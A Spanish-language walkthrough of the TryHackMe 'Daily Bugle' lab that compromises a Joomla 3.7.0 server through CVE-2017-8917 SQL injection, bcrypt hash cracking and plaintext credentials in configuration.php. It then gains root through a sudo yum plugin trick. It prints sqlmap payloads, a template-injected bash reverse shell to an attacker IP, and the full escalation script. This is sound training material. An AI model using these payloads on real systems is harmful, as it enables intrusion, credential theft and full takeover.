---
title: Daily Bugle Writeup - TryHackMe
date: 2023-04-02
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Hard, SQLi]
img_path: /assets/img/commons/dailybugle/
image: dailybugle.png
---

¡Hola!

En este writeup, exploraremos la sala [**Daily Bugle**](https://tryhackme.com/room/dailybugle) de TryHackMe, de dificultad difícil según la plataforma. A través de esta sala, llevaremos a cabo la explotación de una cuenta de Joomla CMS mediante una inyección SQL, pondremos en práctica la técnica de cracking de hashes y, finalmente, escalaremos privilegios mediante el aprovechamiento del binario yum.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.32.232
PING 10.10.32.232 (10.10.32.232) 56(84) bytes of data.
64 bytes from 10.10.32.232: icmp_seq=1 ttl=61 time=294 ms

--- 10.10.32.232 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 293.800/293.800/293.800/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.32.232 -oG allPorts.txt
```

Donde:

- `-p-`: indica que se escaneen todos los puertos posibles (65535) del objetivo.
- `--open`: indica que se muestren solo los puertos abiertos, ignorando los cerrados o filtrados.
- `-n`: indica que no se haga resolución DNS.
- `-sS`: indica que se use el tipo de escaneo TCP SYN.
- `-Pn`: indica que se debe omitir el descubrimiento de hosts y asumir que todos los objetivos están vivos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.32.232`: indica la dirección IP del objetivo a escanear.
- `-oG allPorts.txt`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo allPorts.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 21:17 -05
Nmap scan report for 10.10.32.232
Host is up (0.28s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds
```

Vemos que hay varios puertos habilitados, entre ellos el `22 (SSH)`, `80 (HTTP)` **y** `3306 (SQL)`.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados, con el propósito de obtener más información sobre la configuración y posibles vulnerabilidades del sistema objetivo.

```bash
❯ nmap -p 22,80,3306 -sV -sC --min-rate 5000 10.10.32.232 -oN services.txt
```

Donde:

- `-p 22,80,3306`: indica que se escaneen solo los puertos especificados del objetivo.
- `-sV`: indica que se sondeen los puertos abiertos para determinar la información de servicio y versión.
- `-sC`: indica que se ejecute el script por defecto de Nmap, que realiza varias pruebas comunes como detección de vulnerabilidades o enumeración de recursos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.10.32.232`: indica la dirección IP del objetivo a escanear.
- `-oN services.txt`: indica que se guarde el resultado del escaneo en formato normal en el archivo services.txt.

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 21:18 -05
Nmap scan report for 10.10.32.232
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
|_  256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.97 seconds
```

En el informe se destacan varios aspectos relevantes, entre los cuales se encuentra la posibilidad de que el sistema operativo de la máquina objetivo sea `CentOS`, así como la versión de los servicios SSH (`OpenSSH 7.4`), HTTP (`Apache 2.4.6`) y MySQL (`MariaDB`).

Además, es importante destacar que el servicio web utiliza el **CMS Joomla** y que varias de sus entradas están deshabilitadas en el archivo `robots.txt`. Por otro lado, se observa que la base de datos utilizada es **MariaDB**.

### HTTP - 80

Tras identificar un servicio HTTP en el puerto 80, exploramos el contenido de la página web. Como vemos se trata de un blog de noticias llamado “*Daily Bugle*”, el mismo periódico donde trabaja *Peter Parker*, también conocido como *Spiderman*.

![web](web.png){: .center-image }

Para identificar las tecnologías utilizadas en el servidor HTTP, utilizamos la herramienta `whatweb`. Esta nos permite tener una mejor comprensión de las tecnologías que están corriendo en el servidor y así identificar posibles vectores de ataque asociados a ellas.

```bash
❯ whatweb http://10.10.32.232/
http://10.10.32.232/ [200 OK] Apache[2.4.6], Bootstrap, Cookies[eaa83fe8b963ab08ce9ab7d4a798de05], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.6.40], HttpOnly[eaa83fe8b963ab08ce9ab7d4a798de05], IP[10.10.32.232], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PHP[5.6.40], PasswordField[password], Script[application/json], Title[Home], X-Powered-By[PHP/5.6.40]
```

El resultado confirma que el servidor web está utilizando el **CMS Joomla**, aunque no se ha obtenido una versión específica. 

A continuación, procedemos a realizar una enumeración HTTP utilizando el script NSE `http-enum` para realizar un fuzzing básico de directorios.

```bash
❯ nmap -p 80 --script http-enum 10.10.32.232
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 21:23 -05
Nmap scan report for 10.10.32.232
Host is up (0.27s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /robots.txt: Robots file
|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.0
|   /language/en-GB/en-GB.xml: Joomla version 3.7.0
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 66.34 seconds
```

El resultado confirma que la versión del CMS Joomla es la `3.7.0` y nos muestra algunos directorios de interés, como por ejemplo `/administrator/` que corresponde al panel de administración.

## Análisis de vulnerabilidades

---

Ahora que conocemos la versión de Joomla, procedemos a buscar posibles exploits utilizando `searchploit`. Encontramos que esta versión es vulnerable a ataques de inyección SQL.

```bash
❯ searchsploit Joomla 3.7.0
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                          | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                                       | php/webapps/43488.txt
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Al inspeccionar el contenido del exploit `php/webapps/42033.txt`, se muestra el código de la vulnerabilidad correspondiente al `CVE-2017-8917`, así como también la URL vulnerable, un comando para explotar la vulnerabilidad utilizando `sqlmap`, el parámetro vulnerable `list[fullordering]` y los payloads utilizados.

```bash
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917

URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
```

Nos dirigimos a la URL indicada para verificar si efectivamente es vulnerable a una inyección SQL.

![url](url.png){: .center-image }

Podemos observar que al realizar la consulta SQL obtenemos un error de sintaxis, lo que indica que la página web es vulnerable a **SQLi**.

## Explotación

---

### Inyección SQL en Joomla! 3.7.x - **CVE-2017-8917**

En esta ocasión, utilizamos un script en Python alojado en el repositorio [Exploit-Joomla](https://github.com/stefanlucas/Exploit-Joomla) para explotar la vulnerabilidad `CVE-2017-8917` en cualquier `Joomla 3.7.0`. Este script nos permite enumerar las tablas y los posibles usuarios, junto con todos sus datos.

Para empezar, procedemos a clonar el repositorio.

```bash
git clone https://github.com/stefanlucas/Exploit-Joomla.git
```

Nos dirigimos al directorio clonado.

```bash
cd Exploit-Joomla
```

Para averiguar cómo utilizar el exploit, procedemos a ejecutarlo.

```bash
❯ python joomblah.py
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
usage: joomblah.py [-h] url
joomblah.py: error: too few arguments
```

El resultado del comando nos indica que es necesario proporcionar únicamente la dirección URL del objetivo. Por lo tanto, procedemos a ejecutar el exploit especificando dicha URL.

```bash
❯ python joomblah.py http://10.10.32.232/
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user [u'811', u'Super User', u'jonah', u'jonah@tryhackme.com', u'$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', u'', u'']
  -  Extracting sessions from fb9j5_session
```

La ejecución del exploit nos muestra una tabla denominada `fb9j5_users` y el usuario `jonah`, junto con su dirección de correo electrónico y una contraseña que se encuentra en formato hash.

Utilizamos la herramienta `hashid` para identificar los posibles formatos asociados al hash, y esta nos muestra tres opciones.

```bash
❯ hashid '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt
```

Sin embargo, para asegurarnos del tipo de hash, verificamos manualmente en la página [Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes).

![hashes](hashes.png){: .center-image }

Según el ejemplo del hash que hemos verificado en la página, podemos confirmar que el tipo de hash utilizado es **bcrypt**. Por lo tanto, procederemos a utilizar la herramienta `John the Ripper` para intentar crackear este hash especificando el formato `bcrypt`.

```bash
❯ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:05:08 DONE (2023-04-02 22:20) 0.003237g/s 151.6p/s 151.6c/s 151.6C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Después de finalizar el proceso, obtuvimos la contraseña crackeada, la cual corresponde a `spiderman123`.

Después de intentar sin éxito acceder por SSH utilizando las credenciales del usuario `jonah`, realizamos un intento de inicio de sesión en el panel de administración de Joomla, accediendo a la ruta `/administrator/index.php`. Afortunadamente, tuvimos éxito al iniciar sesión utilizando las mismas credenciales.

![index](index.png)

Una vez que ingresamos al panel de administración, procedemos a editar una plantilla cargando un código que nos permita obtener una shell inversa. Para ello, nos dirigimos a la sección de `Templates` seleccionando la opción `Extensions` y luego `Templates`.

![extensions](extensions.png)

Una vez dentro de `Templates`, seleccionamos cualquier plantilla para editar. En este caso, optamos por modificar la plantilla `Beez3`.

![templates](templates.png)

A continuación, seleccionamos el archivo `/index.php` de la plantilla elegida (en este caso, Beez3) para editarlo. Vamos a introducir un el siguiente código PHP sencillo que nos permite obtener una reverse shell hacia nuestro equipo atacante.

```jsx
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.11.100/443 0>&1'");
```

![customise](customise.png)

Después, procedemos a poner el puerto especificado en el codigo anterior (`443`) en escucha y guardamos los cambios realizados en el archivo `index.php` seleccionando el botón `Save`. Finalmente, seleccionamos `Template Preview` para obtener una shell inversa como usuario `apache`.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.32.232] 37590
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

A continuación procedemos a realizar un **tratamiento de la TTY** para tener una shell inversa más interactiva y funcional. Para ello seguimos los siguientes pasos descritos en: [Tratamiento de la TTY](https://itzjp-sec.github.io/posts/tratamiento-tty/).

### Horizontal User Pivoting

Dado que somos el usuario `apache` y no tenemos privilegios, procedemos a inspeccionar el archivo `/etc/passwd` para identificar otros usuarios del sistema.

```bash
bash-4.2$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
```

En la salida del archivo `/etc/passwd`, se observa que el usuario principal de la máquina es `jjameson`. Por lo tanto, es necesario buscar una forma de escalar privilegios a este usuario.

Si realizamos un escaneo del directorio web (`/var/www/html`), encontraremos un archivo llamado `configuration.php`. Es importante tener en cuenta este tipo de archivos ya que a menudo contienen información valiosa, como contraseñas guardadas en texto plano. En este caso, tenemos suerte y encontramos la contraseña `nv5uz9r3ZEDzVjNu`.

```bash
bash-4.2$ cat configuration.php
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
	public $live_site = '';
	public $secret = 'UAMBRWzHO3oFPmVC';

[...]
```

Al intentar migrar al usuario `jjameson` con la contraseña obtenida, validamos la autenticidad de la misma y ahora nos encontramos autenticados como dicho usuario.

```bash
bash-4.2$ su jjameson
Password: 
[jjameson@dailybugle html]$ id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
```

En este punto ya podemos leer la user flag en el directorio principal del usuario.

```bash
[jjameson@dailybugle html]$ cd /home/jjameson/
[jjameson@dailybugle ~]$ cat user.txt 
27a260fe3cba712c*****************
```

## Escalación de privilegios

---

### Abuso del binario yum con permiso SUDO

Ahora nuestro objetivo es elevar nuestros privilegios y obtener acceso como usuario `root`. Una buena practica es listar los privilegios que tiene el usuario actual para ejecutar comandos con `sudo`. 

```bash
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Como se puede observar, nuestro el usuario `jjameson` tiene privilegios para ejecutar el comando `yum` como superusuario sin necesidad de proporcionar contraseña. `Yum` es un gestor de paquetes utilizado en sistemas operativos Linux.

A continuación, verificamos si existe alguna manera de explotar el binario `yum` para obtener privilegios elevados en [GTFOBins](https://gtfobins.github.io/). Para nuestra fortuna, encontramos que utilizando los siguientes comandos podemos obtener una shell como `root`.

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

En resumen, estos comandos nos permiten generar una shell interactiva con privilegios de `root` mediante la carga de un plugin personalizado.

A continuación, ejecutamos los códigos mencionados anteriormente y logramos obtener una shell con privilegios de usuario `root`.

```bash
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
```

En este punto, lo único que nos queda por hacer es leer la flag de `root` en su directorio principal.

```bash
sh-4.2# cd /root/
sh-4.2# cat root.txt 
eec3d53292b18218****************
```

¡Happy Hacking!
